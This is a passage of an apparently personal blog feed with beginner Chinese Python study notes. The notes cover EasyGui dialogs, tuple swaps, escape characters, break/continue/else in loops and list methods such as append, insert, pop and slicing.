class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210419131015759.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>那一串黄色的报错 大致说的就是你的pip版本低 需要升级 那没办法 只能对pip进行升级<br>同时还有<strong>Python安装库时出现的Requirement already satisfied问题</strong><br><a href="https://wonzwang.blog.csdn.net/article/details/104326741">解决上述问题的方案1</a><br><a href="https://blog.csdn.net/qq_16906867/article/details/105558288">解决上述问题的方案2</a></p><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210419130913810.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>这是我当时对pip的升级 一切准备就绪以后 EasyGui就安装好了 我们的第一步也算是完成了</p><p><strong>如果以后要升级EasyGui版本可以使用 pip install –upgrade easygui 命令</strong></p><h1 id="二、EasyGui的一些使用方法"><a href="#二、EasyGui的一些使用方法" class="headerlink" title="二、EasyGui的一些使用方法"></a>二、EasyGui的一些使用方法</h1><h2 id="1-导入EasyGui"><a href="#1-导入EasyGui" class="headerlink" title="1.导入EasyGui"></a>1.导入EasyGui</h2><p>为了使用EasyGui这个模块 我们先导入它  <strong>最简单的导入语句是 import easygui</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> easygui </span><br><span class="line">easygui.msgbox(<span class="string">&quot;终于成功了！&quot;</span>)</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210419174623110.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p>当然我们肯定还有另外的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> easygui <span class="keyword">import</span>*</span><br><span class="line">msgbox(<span class="string">&quot;这样竟然也行&quot;</span>)</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210419174744532.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p>但是这种方法的话有一个坏处： <strong>容易污染程序的命名空间</strong>  （不太建议使用这一种）</p><p>最后一种 来了：<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210419175135840.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> easygui <span class="keyword">as</span> eg</span><br><span class="line">eg.msgbox(<span class="string">&quot;没想到吧 竟然还有&quot;</span>)</span><br></pre></td></tr></table></figure><p>这一种方法使用 类似下面的<strong>import语句</strong> （建议）：<strong>import easygui as eg,这样可以保持EasyGui的命名空间，同时减少输入字符的数量</strong>    推荐使用这一种</p><h2 id="2-来编写一个带有GUI界面的小程序"><a href="#2-来编写一个带有GUI界面的小程序" class="headerlink" title="2.来编写一个带有GUI界面的小程序"></a>2.来编写一个带有GUI界面的小程序</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​```ruby</span><br><span class="line"><span class="keyword">import</span> easygui <span class="keyword">as</span> eg</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    eg.msgbox(<span class="string">&quot;欢迎进入N0bug的世界&quot;</span>)</span><br><span class="line"></span><br><span class="line">    msg=<span class="string">&quot;你觉得在SLsec可以学到什么？&quot;</span></span><br><span class="line">    title =<span class="string">&quot;游戏互动&quot;</span></span><br><span class="line">    choices =[<span class="string">&quot;学习&quot;</span>,<span class="string">&quot;击剑&quot;</span>,<span class="string">&quot;谈恋爱&quot;</span>,<span class="string">&quot;划水&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    choice =eg.choicebox(msg,title,choices)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># msgbox的参数应该是一个字符串</span></span><br><span class="line">    <span class="comment"># 如果用户选择Cancel,该函数返回None</span></span><br><span class="line">    eg.msgbox(<span class="string">&quot;你的选择是:&quot;</span>+<span class="built_in">str</span>(choice),<span class="string">&quot;结果&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    msg=<span class="string">&quot;还想再玩一次吗？&quot;</span></span><br><span class="line">    title=<span class="string">&quot;请选择&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 弹出一个Continue/Cancel 对话框</span></span><br><span class="line">    <span class="keyword">if</span> eg.ccbox(msg,title):</span><br><span class="line">        <span class="keyword">pass</span>    <span class="comment">#如果选择了Continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sys.exit(<span class="number">0</span>) <span class="comment"># 如果选择了Cancel</span></span><br></pre></td></tr></table></figure><p>​    </p><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210419180721327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>点击OK就可以进入下一个界面<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210419180726998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210419180806735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p>这里会弹出你的选择<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210419180811481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><strong>如果选择Continue 那么程序将会再进行一次<br>如果选择了Cancel  那么程序就会关闭</strong></p><h2 id="3-各种功能演示"><a href="#3-各种功能演示" class="headerlink" title="3.各种功能演示"></a>3.各种功能演示</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import easygui</span><br><span class="line"> easygui.egdemo()</span><br></pre></td></tr></table></figure><p><strong>在IDLE或者PyCharm 、PythonWin、Wing</strong>  上都可以用上述代码来调用<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210419181332164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>成功调用后讲可以尝试EasyGui拥有的各种功能，并将结果打印出来</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学习这件事不能懒 一旦有一天去懈怠了 整个人都会很无力 没有之前的学习效率<br><strong>多练习 多看 多问</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python学习记录3</title>
      <link href="/2021/04/27/Python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%953/"/>
      <url>/2021/04/27/Python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%953/</url>
      
        <content type="html"><![CDATA[<p>﻿## Python学习记录3</p><h1 id="系列文章目录"><a href="#系列文章目录" class="headerlink" title="系列文章目录"></a>系列文章目录</h1><p><font color=#999AAA >今天主要来记录一些学习路上遇到的一些觉得还挺不错的小tips</p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><font color=#999AAA ><p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p></font><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><font color=#999AAA >学会记录很重要 记录什么也是 一定要记那些自己遇到的问题 因为我们每个人遇到的问题可能会有很多的情况 记录自己的才是最适合的</font></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><font color=#999AAA ><h1 id="一、变量名中出现的问题"><a href="#一、变量名中出现的问题" class="headerlink" title="一、变量名中出现的问题"></a>一、变量名中出现的问题</h1><p><strong>变量名通常由字母，数字和下划线构成，但不能以数字打头。</strong><br>这是语法错误！！变量名是区分大小写的   并且支持中文变量名<br><strong>接下来给大家讲一下具体的例子</strong></p><p><strong>python中有一种赋值机制即多元赋值，采用这种方式赋值时，等号两边的对象都是元组并且元组的小括号是可选的。</strong><br>通常形式为x, y, z = 1, 2, ‘a string’<br>等同于 (x, y, z) = (1, 2, ‘a string’)<br>这种赋值类型最经常用到的环境是变量交换，形如</p><p>x, y = y, x<br>这种交换方式无需中间变量即可交换两个变量的值。**<em>那么具体实现机制是怎样的呢？**</em><br>运行时，首先构造一个元组(y, x)，然后构造另一个元组(x, y)，接着用元组(y, x)赋值给(x, y)，元组赋值过程从左到右，依次进行。<br>假如x=1,y=2，先令x=y,此时x=2,然后令y=x,y应该等于2？那么就不能实现变量交换了？对于这个问题，应该从元组的特性说起。</p><p>x, y, z = 1, 2, ‘a string’<br>tuple = (x, y, z)<br>变量名x, y, z都是引用，内存开辟除了三个空间分别存储1, 2, ‘a string’，三个变量分别指向这三块地址。<br>由这三个变量构造的元组tuple，它有三个元素，这三个元素并不是x,y,z这三个变量，而是这三个变量所指向的地址空间里的内容。<br>如果此时再另x=4,此时在地址空间会另开辟出一块空间存储4，x进而指向这块空间，而元组内的三个值仍保持不变。</p><p>所以对于 x, y = y, x 来说，首先由y,x所构成的元组(y,x)其实应该表示为(2,1),那么再从左到右赋值，就可以交换变量的值了。</p><h1 id="二、函数中遇到的问题"><a href="#二、函数中遇到的问题" class="headerlink" title="二、函数中遇到的问题"></a>二、函数中遇到的问题</h1><p>在函数名后面要<strong>加上一对小括号，小括号是必不可少的。</strong></p><p>创建函数时要用<code>def xxx（）：</code></p><h1 id="三、-转义字符"><a href="#三、-转义字符" class="headerlink" title="三、 转义字符"></a>三、 转义字符</h1><p>下面是一些常见的转义字符来表示一些不能直接显示的ASCII字符<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210416164133655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>下面给大家举一个实例：<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210416164212143.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong>如果在字符串的第一个引号前面加上r  就说明后面的字符串是一个原始字符串 转义字符将不再有意义<br>同时反斜杠\不可以放在字符串末尾</strong></p><p>末尾反斜杠的意义是：取消掉enter键的在python中的特殊意义<br>加反斜杠就是比如你一句话写的太长了，换行后方便再写<br><strong>但是三引号并不需要反斜杠\n就能实验换行</strong></p><p><strong>Tips：地板除  就是取比目标结果小的最大整数x\y</strong></p><h1 id="四、-短路逻辑的核心思想"><a href="#四、-短路逻辑的核心思想" class="headerlink" title="四、  短路逻辑的核心思想"></a>四、  短路逻辑的核心思想</h1><p>从左到右，只有当第一个操作数的值无法确定逻辑运算的结果时，才对第二个操作数进行求值。<br>Or操作符只要左边为true  右边根本不用看</p><p>一定要注意运算符优先级！！</p><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210416164359457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><h1 id="补充一种-if-else的高端写法"><a href="#补充一种-if-else的高端写法" class="headerlink" title="补充一种 if else的高端写法"></a>补充一种 if else的高端写法</h1><p>  <img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210416164437706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>  缩进  是Python的灵魂！ 缩进决定了从属关系<br>相同的缩进可以构成一个代码块<br>  <strong>缩进！！</strong>   <strong>yyds!</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python学习记录2</title>
      <link href="/2021/04/20/Python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%952/"/>
      <url>/2021/04/20/Python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%952/</url>
      
        <content type="html"><![CDATA[<p>﻿# Python学习记录2</p><p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p></font><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="一、break-continue-else-语句"><a href="#一、break-continue-else-语句" class="headerlink" title="一、break continue else 语句"></a>一、break continue else 语句</h1><p><strong>1.break语句</strong><br>不知道你是否听过这样的一句话:”**死循环一旦跑起来，就再也没有回头路了…..**”</p><p> <strong>难道真的一进入死循环就再也出不来了吗？</strong><br>其实<strong>break语句</strong>就可以<strong>随时</strong>让程序跳出循环的枷锁<br><strong>break</strong>语句的作用是  <strong>终止当前循环，跳出循环体</strong><br>下面我给大家举几个实例：</p><ol><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tips =<span class="string">&#x27;击剑&#x27;</span></span><br><span class="line">answer = <span class="built_in">input</span>(<span class="string">&#x27;SLsec的传统是什么?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> answer == tips:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    answer = <span class="built_in">input</span>(<span class="string">&#x27;很遗憾，你还没有get到真谛!请重新输入():&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;对呀,击剑才是男人的浪漫&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210401145301380.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p></li></ol><p>程序运行之后，只有当我们输入’<strong>击剑</strong>‘的时候，才会执行break语句，才可以跳出while这个’<strong>死循环</strong>‘</p><p><strong>2.continue语句</strong></p><p>除了break语句以外 <strong>还有一个可以跳出循环的语句 它来了 continue！</strong><br><strong>continue</strong>的作用是  <strong>跳出本轮循环 并开始下一轮的循环</strong> （<strong>但是它在开始下一轮循环之前，会先测试循环条件</strong>）</p><p>同样的用实例来说明<br>如果我们想要获取从1998年到2051年之间所有的闰年月份，那么我们可以通过下面的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> year <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1998</span>,<span class="number">2051</span>):</span><br><span class="line">    <span class="keyword">if</span> (year % <span class="number">4</span> ==<span class="number">0</span> ) <span class="keyword">and</span> (year %<span class="number">100</span> !=<span class="number">0</span>) <span class="keyword">or</span> (year %<span class="number">400</span> == <span class="number">0</span>):</span><br><span class="line">        print(year)</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>程序实现如下：<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210401151244250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p> <strong>3.else语句</strong><br>在之前我的理解中 <strong>if</strong> 和<strong>else</strong>  这两个简直就是亲兄弟一样 要么同时出现要么同时消失，但是通过学习发现<strong>else语句在循环中也有他的一席之地</strong><br>     当<strong>while</strong> 和 <strong>for</strong>  循环语句的后面也可以加上一个<strong>else</strong> 语句，表示 <strong>当条件不成立的时候执行的内容</strong>  语法如下：</p><blockquote><p>while 条件：<br>    循环体   else ：<br>       条件不成立时执行的内容    for 变量 in 可迭代对象：<br>     循环体<br>    else：<br>       条件不成立时执行的内容</p></blockquote><p>在很多的时候其实else的出现  不太影响代码的结果<br>但是当遇到break语句时情况就会出现不同<br>1.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> year <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2018</span>,<span class="number">2100</span>):</span><br><span class="line">    <span class="keyword">if</span> (year %<span class="number">4</span> ==<span class="number">0</span> )<span class="keyword">and</span>(year%<span class="number">100</span>!=<span class="number">0</span>)<span class="keyword">or</span>(year%<span class="number">400</span> ==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;2018年以后的第一个闰年是:&quot;</span>,year)</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210401152539723.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p>2.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> year <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2018</span>,<span class="number">2100</span>):</span><br><span class="line">    <span class="keyword">if</span> (year %<span class="number">4</span> ==<span class="number">0</span> )<span class="keyword">and</span>(year%<span class="number">100</span>!=<span class="number">0</span>)<span class="keyword">or</span>(year%<span class="number">400</span> ==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   print(<span class="string">&quot;2018年以后的第一个闰年是:&quot;</span>,year)</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210401152740233.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>在这里会发现什么也没有执行，那是因为break语句让程序跳出了循环，但却不会执行else中的内容了</p><p><strong>所以说人总是在学习中进步 看到好的 没见过的东西 记录下来 还是很不错的</strong></p><h2 id="二、列表"><a href="#二、列表" class="headerlink" title="二、列表"></a>二、列表</h2><p><strong>1.1创建列表</strong></p><p>只需要使用中括号将数据包起来就行，数据与数据之间用逗号分隔</p><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210401153743471.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>由于上面创建的列表没有命名，即使我们创建好了，也没办法再次使用它。<br><strong>那么我们就需要给它上一个变量名</strong>，然后就可以随时对它进行引用和修改。</p><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210401154111657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>我们在这定义一个名为qq的列表 紧接着用<strong>type()函数来返回指定参数的类型 list 即为列表的意思</strong><br>然后我们又使用<strong>for循环 把qq里面的每一个元素给打印出来</strong><br><strong>只要我们定义了列表的变量名 我们就可以随时对它进行引用和修改</strong></p><p>另外python的列表并不一定放的都是同一类型的数据，<strong>我们可以将各种类型的数据存放在一起  甚至是再放进去一个列表</strong></p><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210401154932334.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong>1.2向列表添加元素</strong><br>向列表中添加元素呢 有很多种方法<br>下面我来一一介绍<br><strong>1.2.1append()方法</strong><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210402102114371.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>可以看到数字5 已经被我们添加到了列表SL的末尾<br>另外<strong>这里的append()并不是一个BIF，它是属于列表对象的一个方法</strong>。中间的‘**.<strong>’  我把它理解为范围的意思：</strong>append()这个方法是属于一个叫SL的列表对象的**<br>那么我们是不是也可以尝试再把6，7，8，9加进去SL列表中呢<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210402102444285.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>结果很显然是不行的，因为<strong>append()方法只支持一个参数</strong><br><strong>1.2.2 extend()方法</strong><br>如果我们想要<strong>同时添加多个数据</strong>，可以使用extend()方法向列表末尾添加多个元素<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210402102722342.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>其实<strong>extend()方法</strong>  实际上是用另一个列表来补充已经拥有的列表，所以它的参数应该为另一个列表。</p><p><strong>1.2.3 insert()方法</strong></p><p>那么<strong>上面的两种方法</strong>无论可以加几个元素 都<strong>只能把元素加在列表的末尾</strong>，那么就应该有一种方法是可以把 <strong>元素加到我们想要的位置的</strong></p><p>所以<strong>insert()方法</strong> 应运而生<br>insert()方法有两个参数：<strong>第一个参数指定待插入的位置（索引值），第二个参数是待插入的元素值</strong></p><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210402104128645.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>在这里我们将<strong>0</strong>  插入SL这个列表的最前面<br>这里要注意的是：<strong>在Python列表中 第一个位置的索引值是0，第二个是1，以此类推</strong></p><p>另外insert()方法中<strong>代表位置的第一个参数也可以为负数：表示与列表末尾的相对距离</strong><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210402104555441.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><strong>1.3从列表中获取元素</strong><br>通过索引值可以直接获取列表中的某个元素<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210402105027471.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>那么<strong>如果一个列表中的元素过多 我们又想要获取列表靠后的元素</strong>该怎么办呢？<br>不妨使用<strong>len()函数 获取这个列表的长度，也就是获取它的元素个数 再减去1 我们就可以获取列表最后一个元素的索引值</strong><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210402105412615.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>这里我们-2就获得了倒数第2个元素<br>其实我们也可以不适用len()函数<br><strong>当我们的索引值为负数的时候，表示从列表的末尾进行反向索引</strong><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210402105641461.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>同样可以实现这样的结果<br>如果<strong>一个列表中又包含了另一个列表</strong>，<strong>而我们又恰好想要取内部列表中的元素时</strong>，我们应该这样做<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210404152239699.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong>1.4从列表中删除元素</strong><br>从列表中删除元素我们也有三种方法<br><strong>1.4.1  remove()方法</strong><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210404152754179.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>当我们使用<strong>remove方法</strong>来删除元素时 不需要知道元素所在位置<br><strong>1.4.2 pop()方法</strong><br>pop()方法是将列表中的<strong>指定元素“弹”出来</strong>，也就是说取出这个元素 并删除该元素的意思<br>但它的参数为索引值<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210404153038721.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong>如果我们没有带参数的时候，默认删除最后一个元素</strong><br><strong>1.4.3 del方法</strong><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210404153220380.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong>1.5列表切片</strong><br>利用<strong>切片（slice）</strong> 可以将一个列表中的某些元素 快速地转移到另一个列表中<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210404153741105.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br> 左边的索引值为开始位置，右边的是结束位置。<br> 但是要注意：<strong>结束位置的元素是不包含的</strong><br> <img "" class="lazyload placeholder" 